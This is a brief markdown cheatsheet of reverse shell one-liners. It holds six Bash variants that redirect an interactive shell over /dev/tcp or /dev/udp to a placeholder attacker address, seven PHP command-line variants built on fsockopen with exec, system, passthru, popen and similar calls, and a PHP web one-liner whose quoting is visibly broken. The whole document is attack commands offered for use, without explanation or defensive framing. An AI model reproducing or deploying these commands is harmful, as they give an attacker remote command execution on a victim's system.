# Reverse Shell Cheatsheet

## Bash Reverse Shell

```bash
1. bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
2. /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0<&1 2>&1
3. bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
4. bash -c "bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1"
5. bash -c "exec bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
6. 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
```

## PHP Reverse Shell

```php
1. php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
2. php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
3. php -r '$sock=fsockopen("ATTACKER_IP",PORT);`/bin/sh -i <&3 >&3 2>&3`;'
4. php -r '$sock=fsockopen("ATTACKER_IP",PORT);system("/bin/sh -i <&3 >&3 2>&3");'
5. php -r '$sock=fsockopen("ATTACKER_IP",PORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
6. php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
7. php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### PHP One Liner

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKER_IP"/PORT 0>&1'");?>
```
